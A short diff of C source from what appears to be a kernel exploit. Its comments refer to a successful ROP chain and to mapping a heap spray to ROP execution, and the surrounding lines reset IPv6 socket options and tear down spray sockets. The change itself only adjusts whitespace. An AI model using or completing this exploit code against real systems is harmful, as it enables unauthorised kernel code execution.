@@ -329,6 +329,7 @@ int main() {
     nanosleep("\0\0\0\0\0\0\0\0\x00\x00\xA0\x86\01\0\0\0", NULL);
     break; // Successful exploit run ROP Chain
     }
+	
     // Map spray to ROP execution
     char* spray_start = spray_bin;
     char* spray_stop = spray_end;
@@ -362,8 +363,7 @@ int main() {
     reset_ipv6_opts(master_sock);
     reset_ipv6_opts(kevent_sock);
 
-
-    cleanup_sockets(spray_sock, SPRAY_TOTAL);
+	cleanup_sockets(spray_sock, SPRAY_TOTAL);
     close(kevent_sock);
     close(master_sock);
     munmap(spray_map, spray_size);
